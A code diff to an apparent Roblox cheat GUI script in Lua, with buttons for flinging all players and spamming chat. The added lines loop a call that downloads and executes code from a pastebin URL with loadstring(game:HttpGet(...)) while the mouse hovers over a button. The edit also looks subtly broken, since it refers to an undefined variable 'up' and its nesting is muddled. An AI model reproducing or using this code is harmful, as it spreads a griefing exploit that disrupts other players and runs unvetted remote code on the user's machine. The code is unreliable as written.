@@ -84,7 +84,19 @@ FLINGALL.TextScaled = true
 FLINGALL.TextSize = 14.000
 FLINGALL.TextWrapped = true
 FLINGALL.MouseButton1Down:connect(function()
+FA = up.MouseEnter:connect(function()
+		while FA do
+			wait()
+
 loadstring(game:HttpGet("https://pastebin.com/raw/0LLBHBq4"))()
+end
+	end)
+end)
+FLINGALL.MouseLeave:connect(function()
+	if FA then
+		FA:Disconnect()
+		FA = nil
+	end
 end)
 SpamCHAT.Parent = Frame
 SpamCHAT.BackgroundColor3 = Color3.fromRGB(226, 155, 64)
